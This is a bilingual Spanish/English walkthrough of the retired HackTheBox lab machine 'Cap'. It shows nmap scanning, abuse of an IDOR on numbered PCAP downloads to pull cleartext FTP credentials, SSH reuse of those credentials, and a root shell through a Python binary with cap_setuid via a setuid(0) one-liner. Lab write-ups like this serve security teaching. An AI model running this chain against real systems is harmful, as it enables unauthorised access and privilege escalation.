# Cap [Easy]

> **ES:** Máquina Linux fácil: un panel de seguridad con descargas PCAP predecibles permite robar credenciales y escalar con una capability de Python.
> **EN:** Easy Linux machine: a security dashboard with predictable PCAP downloads leaks credentials, leading to privesc via a Python capability.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Cap] |
| **URL** | https://app.hackthebox.com/machines/Cap |
| **IP lab** | 10.10.10.245 |
| **Fecha de resolución** | 2025-03-19 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía IDOR en descarga PCAP → credenciales FTP/SSH reutilizadas → `cap_setuid` en Python.
> **EN:** Get `user.txt` and `root.txt` via IDOR on PCAP download → reused FTP/SSH credentials → `cap_setuid` on Python.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] dirsearch
- [ ] ftp / ssh
- [ ] wireshark / tshark (análisis PCAP)
- [ ] linpeas (`linpeas.sh`)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo completo: FTP, SSH y un panel web "Security Dashboard" (Gunicorn) sobre Linux.
> **EN:** Full scan: FTP, SSH and a "Security Dashboard" web panel (Gunicorn) on Linux.

```bash
nmap -sC -sV -oN nmap_init 10.10.10.245
nmap -vv --min-rate=2000 -A -p- 10.10.10.245
```

**Resultado / Result:** 21/tcp vsftpd 3.0.3, 22/tcp OpenSSH 8.2p1 (Ubuntu), 80/tcp Gunicorn "Security Dashboard". OS Linux 4.15–5.19.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El panel tiene "Security Snapshot (5 Second PCAP + Analysis)" con URL numerada (`/data/2`). Probar otros IDs devuelve capturas ajenas.
> **EN:** The panel has "Security Snapshot (5 Second PCAP + Analysis)" with a numbered URL (`/data/2`). Trying other IDs returns other users' captures.

```bash
dirsearch -u http://10.10.10.245
curl -s http://10.10.10.245/data/0 -o snap0.pcap
tshark -r snap0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | head
```

**Resultado / Result:** IDOR confirmado: el snapshot `0` contiene tráfico FTP en claro con usuario y contraseña válidos. Capturas de referencia en `img/` (ver `img/image_20250351-205145.png`).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Las credenciales del PCAP funcionan en FTP y, reutilizadas, también en SSH como `nathan`.
> **EN:** The PCAP credentials work on FTP and, reused, also over SSH as `nathan`.

```bash
ftp nathan@10.10.10.245
ssh nathan@10.10.10.245
```

**Resultado / Result:** Shell como `nathan` por SSH (misma contraseña del FTP). Sin pegar credenciales completas aquí; ver nota local.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El home de `nathan` es legible y contiene `user.txt`.
> **EN:** `nathan`'s home is readable and contains `user.txt`.

```bash
ls -lah /home/nathan/
cat /home/nathan/user.txt
```

**Resultado / Result:** `user.txt` leído (flag no reproducida por ser máquina retirada; se omite igualmente).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `linpeas` muestra `/usr/bin/python3.8` con `cap_setuid+eip`. Con esa capability basta `os.setuid(0)` para ser root.
> **EN:** `linpeas` shows `/usr/bin/python3.8` with `cap_setuid+eip`. That capability makes `os.setuid(0)` enough to become root.

```bash
getcap /usr/bin/python3.8
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
cat /root/root.txt
```

**Resultado / Result:** Shell como `root` vía capabilities (sin exploit de kernel ni sudo). Técnica: GTFOBins/capabilities `cap_setuid`.

---

## 🧠 Lo aprendido / Learned

> **ES:** Los IDs predecibles en descargas (IDOR) exponen datos de otros usuarios; el FTP en claro en PCAPs regala credenciales; revisar `getcap` es tan importante como `sudo -l`.
> **EN:** Predictable download IDs (IDOR) expose other users' data; cleartext FTP inside PCAPs gives away credentials; checking `getcap` matters as much as `sudo -l`.

- [ ] IDOR en endpoints numerados (`/data/<id>`)
- [ ] Extracción de credenciales de PCAP (FTP en claro)
- [ ] Reutilización de credenciales FTP → SSH
- [ ] Privesc con Linux capabilities (`cap_setuid` en Python)

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Cap/index.md` (notas CN/EN sin normalizar, con capturas en `img/`) — autor original de la nota local
- **Walkthrough de referencia:** Máquina Cap en HackTheBox — https://app.hackthebox.com/machines/Cap
- **Referencia técnica:** Linux capabilities / `cap_setuid` — https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y normalizado desde `index.md` al molde `_PLANIFICACION/PLANTILLA_MACHINE.md`; paráfrasis propia, sin flags completas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
